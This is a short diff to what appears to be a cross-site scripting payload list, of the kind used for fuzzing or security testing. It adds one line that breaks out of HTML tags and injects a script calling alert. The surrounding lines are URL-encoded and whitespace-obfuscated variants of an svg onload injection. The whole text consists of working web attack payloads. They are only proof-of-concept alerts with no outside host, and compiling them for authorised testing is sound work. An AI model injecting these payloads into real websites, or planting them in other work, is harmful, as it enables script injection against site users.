@@ -1,4 +1,5 @@
 %3Csvg%20onload%3Dalert%281%29%3E
+">>>>>><marquee>RXSS</marquee></head><abc></script><script>alert('Oushexplo')</script><meta
 %3Csvg+onload%3Dalert%281%29%3E
 <svg%09onload=alert(1)>
 <svg%0Aonload=alert(1)>
